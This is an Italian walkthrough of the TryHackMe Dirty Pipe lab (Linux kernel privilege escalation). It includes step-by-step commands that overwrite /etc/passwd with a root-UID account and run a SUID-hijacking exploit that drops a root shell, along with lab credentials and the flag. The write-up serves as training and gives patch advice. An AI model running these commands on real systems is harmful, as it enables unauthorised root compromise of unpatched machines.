
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/dirtypipe

Nel marzo 2022, un ricercatore di nome Max Kellerman ha reso pubblica una vulnerabilità del kernel Linux (soprannominata "Dirty Pipe" per le sue somiglianze con il famigerato exploit " Dirty Cow " che colpiva le vecchie versioni del kernel) che consentiva agli aggressori di sovrascrivere arbitrariamente i file sul sistema operativo.

Le sovrascritture arbitrarie di file a livello di kernel possono essere sfruttate molto facilmente per aumentare i privilegi sulla macchina (ad esempio per ottenere privilegi di amministratore o "root"). Questa è una vulnerabilità devastante, resa ancora più grave dalla sua portata: tutti i dispositivi che eseguono una versione vulnerabile del kernel Linux (inclusi i telefoni Android) sono interessati!

### Panoramica della Vulnerabilità "Dirty Pipe"

**Cos'è Dirty Pipe?** Dirty Pipe è una vulnerabilità del kernel Linux che consente a un utente di sovrascrivere arbitrariamente file di sistema, a patto che abbia accesso in lettura a quei file. È stata corretta nelle versioni recenti del kernel (5.16.11, 5.15.25 e 5.10.102).

### Come Funziona

1. **Gestione della Memoria nel Kernel**: Il kernel Linux gestisce la memoria in unità chiamate "pagine". Quando un file viene aperto, il kernel carica le sue pagine in memoria.
    
2. **Pipe nel Kernel**: Le pipe sono utilizzate per passare dati tra processi. La chiamata di sistema `splice()` permette di velocizzare il trasferimento dei dati, puntando a pagine già caricate in memoria.
    
3. **La Vulnerabilità**: La vulnerabilità si basa su due bug nel kernel:
    
    - Un bug del 2016 ha permesso di creare pipe con flag arbitrari.
    - Un flag introdotto nel 2020 (PIPE_BUF_FLAG_CAN_MERGE) consente di aggiornare le pagine senza riscrivere i dati.
4. **Sfruttamento**: Un attaccante può aprire un file in sola lettura, preparare una pipe con il flag speciale e poi scrivere dati arbitrari nella pipe, sovrascrivendo il contenuto del file originale.
    

### Conseguenze

Questa vulnerabilità permette di modificare file anche in sistemi protetti o di sola lettura, ma le modifiche non sono permanenti fino a quando il kernel non recupera la memoria.

### Risanamento

L'unico modo per proteggersi da questa vulnerabilità è aggiornare il kernel alle versioni corrette. È fondamentale applicare le patch di sicurezza su tutti i dispositivi Linux e Android.

### PoC

Ci colleghiamo al laboratorio
```
ssh tryhackme@10.10.218.173
```

Password: 
```
TryHackMe123!
```

Una copia del codice originale dell'exploit proof of concept di Max Kellerman (originariamente reperibile nel post del blog sulla divulgazione ) è disponibile sul computer di destinazione all'indirizzo /home/tryhackme/Exploit/PoC/poc.c. Una volta compilato, questo exploit ci offre un ampio controllo su come sfruttare la vulnerabilità Dirty Pipe. Nello specifico, ci consente di specificare il file da sovrascrivere, l' offset con cui sovrascriverlo e il contenuto da inserire. Acquisiremo ciascuno di questi elementi nei paragrafi seguenti. 

Tenendo presente che l'exploit non ci consente di creare file (possiamo solo sovrascrivere le informazioni nei file esistenti), dobbiamo prima trovare un file che il nostro utente possa leggere , ma che ci consenta comunque di elevare i nostri privilegi. La scelta più ovvia e semplice in queste condizioni è [nome del file ] /etc/passwd. Sebbene gli hash delle password siano solitamente memorizzati nel file restricted-access /etc/shadownei moderni sistemi Linux (invece di essere memorizzati tradizionalmente in [nome del file /etc/passwd]), la maggior parte delle varianti di Linux verifica comunque se gli hash delle password degli account sono specificati in [nome del /etc/passwdfile]. Ciò significa che possiamo scrivere un utente con permessi di root e un hash della password noto direttamente nel file passwd!

##### Conoscenze di base: il file Passwd

Le voci della password sono composte da 7 campi , separati da due punti ( :). Ad esempio: root:x:0:0:root:/root:/bin/bash.

In ordine, questi campi sono:

Il nome utente ( root)
L'hash della password dell'utente. Nella maggior parte dei casi, l'hash non verrà effettivamente specificato, ma sostituito con un x. Ciò significa che l'hash può essere trovato in /etc/shadow.
UID dell'utente ( User ID ) : per l'utente root, questo è 0.
Il GID ( Group ID ) dell'utente . Per l'utente root sarà anch'esso .0
Una descrizione dell'account. rootNell'esempio è semplicemente " ", ma può essere lasciata vuota.
La directory home dell'utente ( /root)
Shell di login dell'utente ( /bin/bash)
Se riusciamo a creare manualmente la nostra voce (incluso un hash completo della password) e a inserirla nel file passwd, possiamo creare un nuovo account utente. È interessante notare che Linux non verifica che l'UID e il GID di un account siano univoci, ma solo che i nomi utente siano univoci. In altre parole, possiamo creare un account con il nostro nome utente univoco con UID e GID pari a 0, di fatto conferendo al nostro nuovo account gli stessi permessi dell'account root!

#### Generiamo un hash della password
**Generiamo un hash della password e formiamo una voce passwd valida prima di proseguire.** Scegli una password e usa il opensslcomando per creare un hash SHA512Crypt della password scelta:

Generazione di un hash SHA512Crypt
```
openssl passwd -6 --salt THM "PASSWORD"
```

```
$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.
```

Infine, inserisci il tuo nome utente e hash in questo modello di voce passwd: 

```
USERNAME:HASH:0:0::/root:/bin/bash.
```


Il tuo contributo dovrebbe avere un aspetto simile a questo:
```
muiri:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash
```

```
'muiri:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash   '
```
Nota: la password: 123456 è stata utilizzata per generare l'hash di esempio sopra.

Poiché stiamo sovrascrivendo le voci esistenti nel file delle password, dobbiamo anche aggiungere una nuova riga alla fine della nostra voce. Questo ci assicura di evitare di corrompere la voce con eventuali residui del contenuto precedente della riga.

Il nostro contenuto finale dovrebbe quindi assomigliare a questo (virgolette incluse):

```
'muiri:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash   '
```

Abbiamo il nostro file ( /etc/passwd) e il nostro contenuto (la voce passwd): ora ci serve solo l' offset . L'offset indica il punto del file in cui l'exploit dovrebbe iniziare a scrivere, in altre parole, quale parte del file viene sovrascritta.

La vulnerabilità non ci permetterà di aggiungere dati al file, quindi dovremo scegliere un account e sovrascriverlo. Realisticamente parlando, data la lunghezza della nostra voce passwd (hash incluso), questo probabilmente sovrascriverà diversi account. Esaminando il file passwd, l' games account si distingue come un buon candidato per essere un account poco utilizzato che possiamo permetterci di eliminare per qualche minuto. Possiamo usare grepl' -bopzione per trovare l'offset di games dall'inizio del file:

**Trovare l'offset**
```
grep -b "games" /etc/passwd
```
```
189:games:x:5:60:games:/usr/games:/usr/sbin/nologin
```
L'offset risulta essere 189, fornendoci il pezzo finale del nostro puzzle.

Siamo finalmente pronti a partire!

**Il programma può essere compilato utilizzando i seguenti comandi:**

Comando di compilazione
```
cd ~/Exploit/PoC
```
```
gcc poc.c -o exploit
```
```
ls
```
```
poc.c exploit
```
Questo si sposta nella directory contenente il codice exploit, quindi lo compila con gcc.

Prima di eseguire l'exploit, è fondamentale **eseguire il backup del /etc/passwd file** Si tratta di un exploit potenzialmente dannoso che danneggerà il sistema (almeno per un po'); con il backup del file passwd, potremo facilmente ripristinare il danno una volta completato l'exploit.

Utilizzare 
```
cp /etc/passwd /tmp/passwd
```
per copiare il file passwd in /tmp, quindi eseguire l'exploit!

Il tuo comando dovrebbe assomigliare a questo:

Esecuzione dell'Exploit
```
./exploit /etc/passwd 189 'USERNAME:HASH:0:0::/root:/bin/bash
> '
```

```
 ./exploit /etc/passwd 189 'muiri:$6$THM$MeGI7eYSh.ex3l79m8sMQ2dq9Ux77JfC7XlCgZbneUFAvnHj4gphJKnnveuf2AndcoLn2mmhJVhcxvAIgA8RJ.:0:0::/root:/bin/bash
> '
```
otteniamo
```
It worked!
```

Rispondi alle domande seguenti
Completare
Cambia l'utente (su) nel tuo account root appena creato.
```
su muiri
```
la password è PASSWORD
```
whoami
```
vediamo che siamo root
```
root@dirty-pipe:/home/tryhackme/Exploit/PoC# pwd
/home/tryhackme/Exploit/PoC
root@dirty-pipe:/home/tryhackme/Exploit/PoC# cd /root
root@dirty-pipe:~# ls
flag.txt
root@dirty-pipe:~# cat flag.txt
THM{MmU4Zjg0NDdjNjFiZWM5ZjUyZGEyMzlm}
root@dirty-pipe:~# 
```
Qual è il flag trovato nel /root/flag.txtfile?
```
THM{MmU4Zjg0NDdjNjFiZWM5ZjUyZGEyMzlm}
```
Come accennato in precedenza, abbiamo sovrascritto accidentalmente altri account utente sfruttando Dirty Pipe in questo modo. Ciò potrebbe causare problemi al server; pertanto, come professionisti, dobbiamo intervenire dopo i nostri exploit.

Utilizzando la shell di root, ripristina il /etc/passwdfile originale dal backup.
```
cp /tmp/passwd /etc/passwd
```

### Compito bonus Un secondo exploit


Nell'attività precedente, abbiamo sfruttato la vulnerabilità "Dirty Pipe" utilizzando il codice exploit proof of concept originale di Max Kellerman; tuttavia, da allora sono stati rilasciati altri exploit. Il PoC originale ci permetteva di sovrascrivere qualsiasi file con dati arbitrari con un offset a nostra scelta; tuttavia, altre implementazioni hanno sfruttato la vulnerabilità di scrittura arbitraria di file in diversi modi.

Per dimostrare questo concetto, un secondo script di exploit è stato aggiunto al computer di laboratorio, reperibile sul target all'indirizzo 
```
/home/tryhackme/Exploit/Bl4sty/dirtypipez.c
```
Come suggerisce la struttura delle directory, questa implementazione è stata sviluppata da @bl4sty , un ricercatore di sicurezza che forse ricorderete se avete già completato la stanza " SudoVulns: Baron Samedit ". 
Il codice exploit originale può essere scaricato dal sito web di bl4sty qui ; tuttavia, come accennato in precedenza, una copia è già stata aggiunta al computer di laboratorio.

**Questo exploit porta la scrittura arbitraria di file a un livello superiore, sfruttando una caratteristica piuttosto peculiare della vulnerabilità.I ​​programmi SUID** di solito perdono il loro bit SUID quando si tenta di scriverci; tuttavia, questo non accade con Dirty Pipe: in altre parole, possiamo scrivere su qualsiasi programma che abbia il permesso di esecuzione con privilegi più elevati, senza distruggere inavvertitamente tale permesso extra (come normalmente accade).

L'exploit di Bl4sty sfrutta proprio questo. Invece di sovrascrivere un file come /etc/passwd, **sovrascrive un binario SUID specificato dall'utente (come /bin/su), iniettandovi shellcode che viene poi eseguito con i permessi dell'utente privilegiato (ad esempio root).** Nello specifico, l'exploit dirotta il binario SUID scelto e lo forza a creare un binario backdoor che  /tmp contiene il bit SUID e richiama /bin/sh. Quindi ripristina il binario SUID preso di mira alle sue normali funzionalità aggiungendo nuovamente la sezione sovrascritta e utilizza la backdoor appena creata per concedere all'attaccante una shell come utente privilegiato.

**Sfruttamento**

Prima di continuare con questa operazione, assicurati di aver chiuso la sessione come utente root. Dovresti nuovamente eseguire i comandi nel contesto dell'utente tryhackme.
```
su tryhackme
```
Come tryhackmeutente, compila l'exploit utilizzando la stessa sintassi fornita nell'attività precedente, ad esempio:

Comando di compilazione
```
tryhackme@dirty-pipe:~/Exploit/PoC$ cd ..
tryhackme@dirty-pipe:~/Exploit$ ls
Bl4sty  PoC
tryhackme@dirty-pipe:~/Exploit$ cd Bl4sty
tryhackme@dirty-pipe:~/Exploit/Bl4sty$ ls
dirtypipez.c
tryhackme@dirty-pipe:~/Exploit/Bl4sty$ gcc dirtypipez.c -o exploit
```

```
gcc dirtypipez.c -o exploit
```
```
ls
```
```
dirtypipez.c  exploit
```
**Una volta compilato, l'exploit dovrebbe essere eseguito con un singolo argomento che specifica un binario di destinazione, di proprietà di root e con il bit SUID impostato, ad esempio:**
```
./exploit /bin/su
```

```
id
```
Ora dovresti avere di nuovo una shell root!
```
tryhackme@dirty-pipe:~/Exploit/Bl4sty$ ./exploit /bin/su
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..ologin
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# id
uid=0(root) gid=0(root) groups=0(root),1001(tryhackme)
# 
```
e siamo di nuovo root!

Rimuovere il binario SUID creato dallo script ( /tmp/sh).

[Facoltativo] Trova online un altro exploit per questa vulnerabilità. Esamina il codice per assicurarti che funzioni correttamente, quindi caricalo sul target e prova a sfruttare la vulnerabilità in un terzo modo.

